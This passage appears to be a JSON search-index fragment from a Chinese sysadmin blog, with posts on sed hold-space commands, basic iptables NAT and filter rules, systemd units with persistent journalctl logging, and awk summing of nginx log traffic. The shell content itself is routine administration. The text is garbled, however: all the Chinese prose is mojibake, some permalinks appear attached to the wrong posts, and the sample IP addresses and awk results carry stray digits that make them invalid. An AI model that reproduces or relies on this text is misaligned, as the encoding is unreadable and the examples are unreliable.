spaceï¼Œé»˜è®¤éƒ½æ˜¯ç©ºçš„\u003c/p\u003e\n\u003cp\u003eå¼€å§‹å¤„ç†çš„æ—¶å€™ï¼Œå°±ä»æ–‡ä»¶é‡Œä¸€è¡Œä¸€è¡Œè¯»å…¥ pattern space ï¼Œè¿›è¡Œå¤„ç†ï¼Œhold space åªåœ¨ä½ éœ€è¦ç”¨åˆ°å®ƒçš„æ—¶å€™æ‰ä¼šå‡ºç°ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ed ï¼š æ¸…ç©ºpattern spaceä¸­çš„å†…å®¹ï¼Œç«‹å³å¼€å§‹ä¸‹ä¸ªå¾ªç¯(æ„æ€æ˜¯è·³è¿‡é»˜è®¤çš„è¾“å‡ºpattern spaceå†…å®¹çš„é˜¶æ®µï¼Ÿï¼Ÿï¼Ÿä¸çŸ¥ç†è§£çš„å¯¹ä¸å¯¹)\r\nh ï¼š ç”¨pattern spaceä¸­çš„å†…å®¹æ›¿æ¢hold patternä¸­çš„å†…å®¹\r\nH ï¼š åœ¨hold spaceä¸­çš„å†…å®¹åé¢è¿½åŠ ä¸€ä¸ªæ¢è¡Œï¼ŒæŠŠpattern spaceä¸­çš„å†…å®¹è¿½åŠ åˆ°hold spaceä¸­\r\ng ï¼š ç”¨hold spaceä¸­çš„å†…å®¹æ›¿æ¢pattern spaceä¸­çš„å†…å®¹\r\nG ï¼š åœ¨pattern spaceä¸­çš„å†…å®¹åé¢è¿½åŠ ä¸€ä¸ªæ¢è¡Œï¼ŒæŠŠhold spaceä¸­çš„å†…å®¹è¿½åŠ åˆ°pattern spaceä¸­\r\n\r\nh, gä¼šæ›¿æ¢ï¼ˆå¯ä»¥ç†è§£ä¸ºå…ˆæ¸…ç©ºï¼Œå†å¤åˆ¶ï¼‰, H, Gæ˜¯è¿½åŠ ã€‚\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ehHæ˜¯æ”¾è¿‡å»ï¼ŒgGæ˜¯æ‹¿è¿‡æ¥ï¼Œå°å†™æ˜¯æ›¿æ¢ï¼Œå¤§å†™æ˜¯è¿½åŠ \u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"1666593244877\" loading=\"lazy\" src=\"/posts/20221024-sed_advanced/1666593244877.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåˆ†æä¸€ä¸‹ç»å…¸çš„å°†æ–‡ä»¶å†…å®¹åå‘æ‰“å°\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecat 1.txt\r\n1\r\n2\r\n3\r\n\r\ncat 1.txt | sed -n \u0026#39;1!G;h;$p\u0026#39;\r\n3\r\n2\r\n1\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u0026lsquo;1!G;h;$p\u0026rsquo; åˆ†æä¸€ä¸‹ï¼Œ1!Gå°±æ˜¯è¯´ç¬¬ä¸€è¡Œä¸æ‰§è¡ŒGï¼Œä»ç¬¬äºŒè¡Œå¼€å§‹æ‰§è¡ŒGï¼›ç„¶åhæ˜¯æ¯è¡Œéƒ½æ‰§è¡Œï¼Œæœ€åä¸€è¡Œçš„æ—¶å€™æ‰§è¡Œp\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003einput | pattern |  hold   | command | pattern | hold | command | pattern | hold\r\n1     | 1       |  ç©ºè¡Œ    |         | 1       | ç©ºè¡Œ |  h      | 1       | 1\r\n2     | 2       |  1      | G       | 21      | 1    |  h      | 21      | 21\r\n3     | 3       |  21     | G       | 321     | 21   |  h      | 321     | 321\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"1666595506589\" loading=\"lazy\" src=\"/posts/20221024-sed_advanced/1666595506589.png\"\u003e\u003c/p\u003e","title":"sedçš„è¿›é˜¶ç”¨æ³•"},{"content":"é¢è¯•çš„æ—¶å€™ç»å¸¸ä¼šè¢«é—®åˆ° iptables çš„é—®é¢˜ï¼Œé‚£ä¹ˆä¸‹é¢å°±è¿ç»´è§’åº¦æ¥æ€»ç»“ä¸€ä¸‹åŸºæœ¬çš„ç”¨æ³•ã€‚\nçœ‹æ™•äº†å§ï¼Œä¸è¦ç´§ï¼Œæˆ‘ä»¬å…³æ³¨ä¸Šé¢çš„5ä¸ªçº¢è‰²ï¼Œ5ä¸ªé“¾æ¡ï¼Œç„¶åç»§ç»­çœ‹ä¸‹é¢çš„è¡¨ï¼Œè¯¦ç»†è§£é‡Šäº†ä¸Šé¢çš„æµç¨‹ï¼š\nä¸¤å¼ å›¾ç»“åˆèµ·æ¥çœ‹ï¼Œæ„æ€å°±æ˜¯æ•´ä¸ª iptables å¯ä»¥åŠ¨æ‰‹çš„åœ°æ–¹å¤ªå¤šäº†ã€‚\næˆ‘ä»¬å®Œå…¨æ²¡å¿…è¦å…³æ³¨é‚£ä¹ˆå¤šçš„ç»†èŠ‚ï¼Œå¸¸ç”¨çš„åœ°æ–¹å°±2ä¸ªï¼š\nä¸€ã€æœ€åçš„å‡ºå£nat postrouting iptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1 ä¸Šé¢æ˜¯åš openvpn æ—¶å¸¸ç”¨çš„ï¼Œä¸€å®šè®°å¾—ä¸è¦ä¹±ç”¨ MASQUERADEï¼Œè€Œè¦æŒ‡å®š ç‰¹å®šç½‘æ®µï¼ˆ10.11.0.0/16ï¼‰ ä» ç‰¹å®šIPï¼ˆ172.16.8.1ï¼‰ å‡ºå»ã€‚\näºŒã€filterè¡¨ filterè¡¨æ˜¯ iptables ç¼ºçœä¸å¸¦å‚æ•°æŸ¥çœ‹çš„è¡¨ï¼Œç”¨äºè¿‡æ»¤æ•°æ®åŒ…ï¼Œè¿™æ˜¯æˆ‘ä»¬æ“ä½œçš„æœ€å¤šçš„åœ°æ–¹\niptables -I INPUT -s 185.207.178.236/32 -p tcp --dport 12530 -j ACCEPT\riptables -A INPUT -p tcp --dport 12530 -j DROP ä¸Šé¢å°±åªå¼€æ”¾äº†ä¸€ä¸ªIP 185.207.178.236å¯ä»¥è®¿é—®æœ¬æœºçš„12530ç«¯å£ï¼Œå…¶ä½™çš„ç»Ÿç»Ÿå°æ‰ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„è„šæœ¬äº†ã€‚\nOKï¼Œä»¥ä¸Šä¸¤ç‚¹æ˜¯æœ€å¸¸ç”¨çš„ã€‚å…¶ä½™çš„ç«¯å£è½¬å‘ä¹‹ç±»çš„ï¼Œæœ€å¥½ä¸­é—´ç”¨haproxyå’Œnginxè¿›è¡Œä»£ç†ï¼Œå¦åˆ™æŸ¥çœ‹ iptables ç³»ç»Ÿçš„æ¶æ„å°±å˜å¾—ä¸æ¸…æ™°äº†ã€‚\nä¸‹é¢è´´ä¸Šå¸¸ç”¨çš„å‚æ•°ï¼š\n-p tcp/udp/icmp/all\tåŒ¹é…åè®®ï¼Œallä¼šåŒ¹é…æ‰€æœ‰åè®®\r-s addr[/mask]\tåŒ¹é…æºåœ°å€\r-d addr[/mask] åŒ¹é…ç›®æ ‡åœ°å€\t--sport\tåŒ¹é…æºç«¯å£ï¼ˆå¯æŒ‡å®šè¿ç»­çš„ç«¯å£ï¼‰å¦‚--sport80\r--dport\tåŒ¹é…ç›®çš„ç«¯å£ï¼ˆå¯æŒ‡å®šè¿ç»­çš„ç«¯å£ï¼‰å¦‚--dport80\r-o interface\tåŒ¹é…å‡ºå£ç½‘å¡ï¼Œåªé€‚ç”¨äºFORWARDã€POSTROUTINGã€OUTPUTï¼ˆä¾‹ï¼šiptables -A FORWARD -o eth0ï¼‰\r-i interface\tåŒ¹é…å…¥å£ç½‘å¡ï¼Œåªé€‚ç”¨äºPREROUTINGã€INPUTã€FORWARD\r--icmp-type\tåŒ¹é…icmpç±»å‹ï¼ˆä½¿ç”¨iptables -p icmp -hå¯æŸ¥çœ‹å¯ç”¨çš„icmpç±»å‹ï¼‰\r--tcp-flags mask comp\tåŒ¹é…TCPæ ‡è®°ï¼Œmaskè¡¨ç¤ºæ£€æŸ¥èŒƒå›´ï¼Œcompè¡¨ç¤ºåŒ¹é…maskä¸­çš„å“ªäº›æ ‡è®°ï¼ˆä¾‹ï¼šiptables -A FORWARD -p tcp --tcp-flags ALL SYN,ACK -j ACCEPT è¡¨ç¤ºåŒ¹é…SYNå’ŒACKæ ‡è®°çš„æ•°æ®åŒ…ï¼‰\r-j DROP/ACCEPT/REJECT/LOG\tæ‹’ç»/å…è®¸/æ‹’ç»å¹¶å‘å‡ºæ¶ˆæ¯/åœ¨/var/log/messagesä¸­ç™»è®°åˆ†ç»„åŒ¹é…çš„è®°å½•\r-m mac -mac\tç»‘å®šMACåœ°å€\r-m limit -limit 1/s 1/m\tè®¾ç½®æ—¶é—´ç­–ç•¥\r-s 192.168.1.153æˆ–192.168.1.0/24\tæŒ‡å®šæºåœ°å€æˆ–åœ°å€æ®µ\r-d 192.168.1.153æˆ–192.168.1.0/24\tæŒ‡å®šç›®æ ‡åœ°å€æˆ–åœ°å€æ®µ\r-s ! 192.168.1.0\tæŒ‡å®šæºåœ°å€ä»¥å¤–çš„ åŸºæœ¬çš„2ä¸ªç”¨æ³•è¶³å¤Ÿæ»¡è¶³æ—¥å¸¸è¿ç»´çš„éœ€è¦äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20221024-iptables/","summary":"\u003cp\u003eé¢è¯•çš„æ—¶å€™ç»å¸¸ä¼šè¢«é—®åˆ° iptables çš„é—®é¢˜ï¼Œé‚£ä¹ˆä¸‹é¢å°±è¿ç»´è§’åº¦æ¥æ€»ç»“ä¸€ä¸‹åŸºæœ¬çš„ç”¨æ³•ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"1666582967919\" loading=\"lazy\" src=\"/posts/20221024-iptables/1666582967919.png\"\u003e\u003c/p\u003e\n\u003cp\u003eçœ‹æ™•äº†å§ï¼Œä¸è¦ç´§ï¼Œæˆ‘ä»¬å…³æ³¨ä¸Šé¢çš„5ä¸ªçº¢è‰²ï¼Œ5ä¸ªé“¾æ¡ï¼Œç„¶åç»§ç»­çœ‹ä¸‹é¢çš„è¡¨ï¼Œè¯¦ç»†è§£é‡Šäº†ä¸Šé¢çš„æµç¨‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"img\" loading=\"lazy\" src=\"/posts/20221024-iptables/image-20220719121029628.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸¤å¼ å›¾ç»“åˆèµ·æ¥çœ‹ï¼Œæ„æ€å°±æ˜¯æ•´ä¸ª iptables å¯ä»¥åŠ¨æ‰‹çš„åœ°æ–¹å¤ªå¤šäº†ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å®Œå…¨æ²¡å¿…è¦å…³æ³¨é‚£ä¹ˆå¤šçš„ç»†èŠ‚ï¼Œå¸¸ç”¨çš„åœ°æ–¹å°±2ä¸ªï¼š\u003c/p\u003e\n\u003ch4 id=\"ä¸€æœ€åçš„å‡ºå£nat-postrouting\"\u003eä¸€ã€æœ€åçš„å‡ºå£nat postrouting\u003c/h4\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eiptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸Šé¢æ˜¯åš openvpn æ—¶å¸¸ç”¨çš„ï¼Œä¸€å®šè®°å¾—ä¸è¦ä¹±ç”¨ MASQUERADEï¼Œè€Œè¦æŒ‡å®š ç‰¹å®šç½‘æ®µï¼ˆ10.11.0.0/16ï¼‰ ä» ç‰¹å®šIPï¼ˆ172.16.8.1ï¼‰ å‡ºå»ã€‚\u003c/p\u003e\n\u003ch4 id=\"äºŒfilterè¡¨\"\u003eäºŒã€filterè¡¨\u003c/h4\u003e\n\u003cp\u003efilterè¡¨æ˜¯ iptables ç¼ºçœä¸å¸¦å‚æ•°æŸ¥çœ‹çš„è¡¨ï¼Œç”¨äºè¿‡æ»¤æ•°æ®åŒ…ï¼Œè¿™æ˜¯æˆ‘ä»¬æ“ä½œçš„æœ€å¤šçš„åœ°æ–¹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eiptables -I INPUT -s 185.207.178.236/32 -p tcp --dport 12530 -j ACCEPT\r\niptables -A INPUT -p tcp --dport 12530 -j DROP\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸Šé¢å°±åªå¼€æ”¾äº†ä¸€ä¸ªIP 185.207.178.236å¯ä»¥è®¿é—®æœ¬æœºçš„12530ç«¯å£ï¼Œå…¶ä½™çš„ç»Ÿç»Ÿå°æ‰ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„è„šæœ¬äº†ã€‚\u003c/p\u003e\n\u003cp\u003eOKï¼Œä»¥ä¸Šä¸¤ç‚¹æ˜¯æœ€å¸¸ç”¨çš„ã€‚å…¶ä½™çš„ç«¯å£è½¬å‘ä¹‹ç±»çš„ï¼Œæœ€å¥½ä¸­é—´ç”¨haproxyå’Œnginxè¿›è¡Œä»£ç†ï¼Œå¦åˆ™æŸ¥çœ‹ iptables ç³»ç»Ÿçš„æ¶æ„å°±å˜å¾—ä¸æ¸…æ™°äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢è´´ä¸Šå¸¸ç”¨çš„å‚æ•°ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e-p tcp/udp/icmp/all\t        åŒ¹é…åè®®ï¼Œallä¼šåŒ¹é…æ‰€æœ‰åè®®\r\n-s addr[/mask]\t            åŒ¹é…æºåœ°å€\r\n-d addr[/mask]              åŒ¹é…ç›®æ ‡åœ°å€\t\r\n--sport\t                    åŒ¹é…æºç«¯å£ï¼ˆå¯æŒ‡å®šè¿ç»­çš„ç«¯å£ï¼‰å¦‚--sport80\r\n--dport\t                    åŒ¹é…ç›®çš„ç«¯å£ï¼ˆå¯æŒ‡å®šè¿ç»­çš„ç«¯å£ï¼‰å¦‚--dport80\r\n-o interface\t            åŒ¹é…å‡ºå£ç½‘å¡ï¼Œåªé€‚ç”¨äºFORWARDã€POSTROUTINGã€OUTPUTï¼ˆä¾‹ï¼šiptables -A FORWARD -o eth0ï¼‰\r\n-i interface\t            åŒ¹é…å…¥å£ç½‘å¡ï¼Œåªé€‚ç”¨äºPREROUTINGã€INPUTã€FORWARD\r\n--icmp-type\t                åŒ¹é…icmpç±»å‹ï¼ˆä½¿ç”¨iptables -p icmp -hå¯æŸ¥çœ‹å¯ç”¨çš„icmpç±»å‹ï¼‰\r\n--tcp-flags mask comp\t    åŒ¹é…TCPæ ‡è®°ï¼Œmaskè¡¨ç¤ºæ£€æŸ¥èŒƒå›´ï¼Œcompè¡¨ç¤ºåŒ¹é…maskä¸­çš„å“ªäº›æ ‡è®°ï¼ˆä¾‹ï¼šiptables -A FORWARD -p tcp --tcp-flags ALL SYN,ACK -j ACCEPT è¡¨ç¤ºåŒ¹é…SYNå’ŒACKæ ‡è®°çš„æ•°æ®åŒ…ï¼‰\r\n-j DROP/ACCEPT/REJECT/LOG\tæ‹’ç»/å…è®¸/æ‹’ç»å¹¶å‘å‡ºæ¶ˆæ¯/åœ¨/var/log/messagesä¸­ç™»è®°åˆ†ç»„åŒ¹é…çš„è®°å½•\r\n-m mac -mac\tç»‘å®šMACåœ°å€\r\n-m limit -limit 1/s 1/m\t    è®¾ç½®æ—¶é—´ç­–ç•¥\r\n-s 192.168.1.153æˆ–192.168.1.0/24\tæŒ‡å®šæºåœ°å€æˆ–åœ°å€æ®µ\r\n-d 192.168.1.153æˆ–192.168.1.0/24\tæŒ‡å®šç›®æ ‡åœ°å€æˆ–åœ°å€æ®µ\r\n-s ! 192.168.1.0\tæŒ‡å®šæºåœ°å€ä»¥å¤–çš„\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eåŸºæœ¬çš„2ä¸ªç”¨æ³•è¶³å¤Ÿæ»¡è¶³æ—¥å¸¸è¿ç»´çš„éœ€è¦äº†ã€‚\u003c/p\u003e","title":"iptablesçš„åŸºæœ¬ç”¨æ³•"},{"content":"æ—¶ä»£å·²ç»è¿›åŒ–åˆ° systemd çš„å¹´ä»£äº†ï¼Œservice åº”è¯¥æ˜¯å½»åº•æ²¡æœ‰å¸‚åœºäº†\nsystemd çš„å¥½å¤„æ˜¯å†™ç¨‹åºçš„æ—¶å€™å†ä¹Ÿä¸ç”¨ fork ç”©è„±çˆ¶è¿›ç¨‹äº†ï¼Œæ—¥å¿—ç›´æ¥è¾“å‡ºç»ˆç«¯å³å¯\nå¯¹ java æ¥è¯´ä¹Ÿæ˜¯ä¸ªå¥½äº‹ï¼Œæ‰€æœ‰çš„æ—¥å¿—æ¯”å¦‚WARN ERROR INFOéƒ½å¯ä»¥äº¤ç»™journalæ¥ç®¡ç†ï¼Œè¿™æ ·è¦æŸ¥æ‰¾æ—¥å¿—ä¹Ÿéå¸¸æ–¹ä¾¿äº†ã€‚\nä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è¦æŠŠä¸€ä¸ªjavaå¯åŠ¨çš„ç¨‹åºåšæˆ systemd çš„ï¼š\nvim /etc/systemd/system/circle.service\n[Unit] After=network.target Wants=network.target [Service] WorkingDirectory=/export/prod/server Type=simple ExecStart=/usr/bin/java -jar -Dspring.config.location=application.properties -Dlog4j2.formatMsgNoLookups=true server.jar Restart=on-failure RestartSec=1s [Install] WantedBy=multi-user.target ç„¶åå°±å¯ä»¥è¿è¡Œäº†ï¼š\nsystemctl daemon-reload systemctl start circle æ³¨æ„ä¸Šé¢çš„WorkingDirectoryï¼Œå› ä¸ºä¸‹é¢javaå¯åŠ¨æŒ‡å®š application.properties é…ç½®æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰ç”¨ç»å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆè¿™é‡Œå°±è¦æŒ‡å®šå½“å‰å·¥ä½œç›®å½•äº†ã€‚\nå¦å¤–RestartSec=1sä¹Ÿæ”¹äº†ï¼Œç¼ºçœæ˜¯10msï¼Œå¤ªå¿«äº†\nå½“ç„¶è¿™åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œæ—¥å¿—æ˜¯å½’journalç®¡äº†ï¼Œjournalè¿˜æ˜¯éœ€è¦è¿›ä¸€æ­¥é…ç½®çš„\né¦–å…ˆå¿…é¡»è¦æŒä¹…åŒ–å­˜å‚¨åˆ°ç£ç›˜ï¼Œå¦åˆ™åªä¼šåœ¨/run/log/journalå†…å­˜ä¸­å­˜æ”¾ï¼Œé‡å¯å°±æ²¡äº†\n#disk-usageæŸ¥çœ‹çš„æ˜¯: å†…å­˜+/var/log/journalçš„åŠ èµ·æ¥çš„æ€»å’Œå¤§å° journalctl --disk-usage ç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹é…ç½®ï¼Œè®©å®ƒæŒä¹…åŒ–\nvi /etc/systemd/journald.conf Storage=persistent ä¿®æ”¹é‡å¯\nmkdir /var/log/journal systemd-tmpfiles --create --prefix /var/log/journal systemctl restart systemd-journald æœ€ååˆ·ä¸€ä¸‹ï¼ŒæŠŠå†…å­˜çš„æ–‡ä»¶åˆ·åˆ°ç£ç›˜ä¸­\njournalctl --flush è¿˜å¯ä»¥è®¾ç½®ä¿å­˜å¤©æ•°ï¼š\njournalctl --vacuum-time=31d æŸ¥çœ‹æ˜¯ä»é‚£ä¸€å¤©å¼€å§‹ä¿å­˜çš„ï¼Œè¿›ç›®å½•æŸ¥çœ‹æ—¶é—´æˆ³å³å¯\ncd /var/log/journal ls -lha æœ€åå°±æ˜¯ä¸€ä¸ªç§˜ç±äº†ï¼Œå¦‚æœæŠŠæ—¥å¿—å¼„å‡ºæ¥æŸ¥çœ‹\njournalctl -u circle --since \u0026#34;2022-10-19 14:30:00\u0026#34; --until \u0026#34;2022-10-19 15:00:00\u0026#34; å¼€å‘äººå‘˜ç»å¸¸é—®æˆ‘è¦æ—¥å¿—ï¼Œè¿™æ ·å°±ç‰¹åˆ«æ–¹ä¾¿å¿«æ·äº†ï¼Œæ¯”ä»log4jçš„æ—¥å¿—ç›®å½•é‡Œæ‹‰æ–¹ä¾¿çš„å¤šã€‚\n","permalink":"https://rendoumi.com/posts/20220925-awk_usage/","summary":"\u003cp\u003eæ—¶ä»£å·²ç»è¿›åŒ–åˆ° systemd çš„å¹´ä»£äº†ï¼Œservice åº”è¯¥æ˜¯å½»åº•æ²¡æœ‰å¸‚åœºäº†\u003c/p\u003e\n\u003cp\u003esystemd çš„å¥½å¤„æ˜¯å†™ç¨‹åºçš„æ—¶å€™å†ä¹Ÿä¸ç”¨ fork ç”©è„±çˆ¶è¿›ç¨‹äº†ï¼Œæ—¥å¿—ç›´æ¥è¾“å‡ºç»ˆç«¯å³å¯\u003c/p\u003e\n\u003cp\u003eå¯¹ java æ¥è¯´ä¹Ÿæ˜¯ä¸ªå¥½äº‹ï¼Œæ‰€æœ‰çš„æ—¥å¿—æ¯”å¦‚WARN ERROR INFOéƒ½å¯ä»¥äº¤ç»™journalæ¥ç®¡ç†ï¼Œè¿™æ ·è¦æŸ¥æ‰¾æ—¥å¿—ä¹Ÿéå¸¸æ–¹ä¾¿äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è¦æŠŠä¸€ä¸ªjavaå¯åŠ¨çš„ç¨‹åºåšæˆ systemd çš„ï¼š\u003c/p\u003e\n\u003cp\u003evim /etc/systemd/system/circle.service\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[Unit]\nAfter=network.target\nWants=network.target\n\n[Service]\nWorkingDirectory=/export/prod/server\nType=simple\nExecStart=/usr/bin/java -jar  -Dspring.config.location=application.properties -Dlog4j2.formatMsgNoLookups=true server.jar\nRestart=on-failure\nRestartSec=1s\n\n[Install]\nWantedBy=multi-user.target\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eç„¶åå°±å¯ä»¥è¿è¡Œäº†ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esystemctl daemon-reload\nsystemctl start circle\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢çš„WorkingDirectoryï¼Œå› ä¸ºä¸‹é¢javaå¯åŠ¨æŒ‡å®š application.properties é…ç½®æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰ç”¨ç»å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆè¿™é‡Œå°±è¦æŒ‡å®šå½“å‰å·¥ä½œç›®å½•äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¦å¤–RestartSec=1sä¹Ÿæ”¹äº†ï¼Œç¼ºçœæ˜¯10msï¼Œå¤ªå¿«äº†\u003c/p\u003e\n\u003cp\u003eå½“ç„¶è¿™åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œæ—¥å¿—æ˜¯å½’journalç®¡äº†ï¼Œjournalè¿˜æ˜¯éœ€è¦è¿›ä¸€æ­¥é…ç½®çš„\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå¿…é¡»è¦æŒä¹…åŒ–å­˜å‚¨åˆ°ç£ç›˜ï¼Œå¦åˆ™åªä¼šåœ¨/run/log/journalå†…å­˜ä¸­å­˜æ”¾ï¼Œé‡å¯å°±æ²¡äº†\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#disk-usageæŸ¥çœ‹çš„æ˜¯: å†…å­˜+/var/log/journalçš„åŠ èµ·æ¥çš„æ€»å’Œå¤§å°\njournalctl --disk-usage\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹é…ç½®ï¼Œè®©å®ƒæŒä¹…åŒ–\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evi /etc/systemd/journald.conf\nStorage=persistent\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¿®æ”¹é‡å¯\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emkdir /var/log/journal\nsystemd-tmpfiles --create --prefix /var/log/journal\nsystemctl restart systemd-journald\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæœ€ååˆ·ä¸€ä¸‹ï¼ŒæŠŠå†…å­˜çš„æ–‡ä»¶åˆ·åˆ°ç£ç›˜ä¸­\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ejournalctl --flush\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¿˜å¯ä»¥è®¾ç½®ä¿å­˜å¤©æ•°ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ejournalctl --vacuum-time=31d\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæŸ¥çœ‹æ˜¯ä»é‚£ä¸€å¤©å¼€å§‹ä¿å­˜çš„ï¼Œè¿›ç›®å½•æŸ¥çœ‹æ—¶é—´æˆ³å³å¯\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecd /var/log/journal\nls -lha \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæœ€åå°±æ˜¯ä¸€ä¸ªç§˜ç±äº†ï¼Œå¦‚æœæŠŠæ—¥å¿—å¼„å‡ºæ¥æŸ¥çœ‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ejournalctl -u circle --since \u0026#34;2022-10-19 14:30:00\u0026#34; --until \u0026#34;2022-10-19 15:00:00\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eå¼€å‘äººå‘˜ç»å¸¸é—®æˆ‘è¦æ—¥å¿—ï¼Œè¿™æ ·å°±ç‰¹åˆ«æ–¹ä¾¿å¿«æ·äº†ï¼Œæ¯”ä»log4jçš„æ—¥å¿—ç›®å½•é‡Œæ‹‰æ–¹ä¾¿çš„å¤šã€‚\u003c/p\u003e","title":"systemdä¸journalctlçš„åŒå‰‘åˆç’§"},{"content":"awk æ˜¯æ¯”è¾ƒå¼ºåŠ›çš„å·¥å…·ï¼Œè·Ÿcutå’Œsedç»„åˆèµ·æ¥ï¼Œä¼šæœ‰æ„æƒ³ä¸åˆ°çš„ä½œç”¨\nä¸¾ä¸ªç®€å•ä¾‹å­ï¼Œæˆ‘ä»¬nginxçš„access.logå¦‚ä¸‹ï¼š\n110.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r220.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 20616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r330.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 30616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r410.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r530.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r650.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 50616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r760.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 60616 \u0026#34;http://my.jjwxc.net/\u0026#34; ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯ipï¼Œç„¶åå€’æ•°ç¬¬3ä¸ªæ˜¯200ï¼Œè¡¨ç¤º200 OKï¼Œåé¢çš„å°±æ˜¯ä¼ è¾“äº†å¤šå°‘æ•°æ®ä¸¤ç»™å®¢æˆ·ç«¯ æˆ‘ä»¬è¦ç»Ÿè®¡ä¸€ä¸‹æµé‡å¤§çš„å‰5åæ˜¯è°ã€‚\næ€è·¯å¦‚ä¸‹ï¼š æˆ‘ä»¬éœ€è¦é€ ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæ•°ç»„çš„é”®å€¼å°±æ˜¯ipï¼Œç„¶åå€¼å°±æ˜¯æ•°æ®é‡ï¼Œå¦‚æœipé‡å¤ï¼Œé‚£ä¹ˆå°±ç´¯åŠ æ•°æ®\ncat access.log | awk -F\\\u0026#34; \u0026#39;{print $1 $3}\u0026#39;|cut -d\u0026#39; \u0026#39; -f 1,9|sort -nrk 2| awk \u0026#39;{ip[$1] +=$2}END{for (i in ip) {print i, ip[i]}}\u0026#39; | sed -n \u0026#39;1,5p\u0026#39; æœ€åç»“æœï¼š\n160.244.232.88 60616\r220.244.232.88 20616\r330.244.232.88 41232\r450.244.232.88 50616\r510.244.232.88 21232 æ³¨æ„ 10.244.232.88 å’Œ 30.244.232.88 åé¢çš„æ•°æ®éƒ½æ˜¯ç´¯åŠ è¿‡çš„ã€‚\n","permalink":"https://rendoumi.com/posts/20221019-systemctl/","summary":"\u003cp\u003eawk 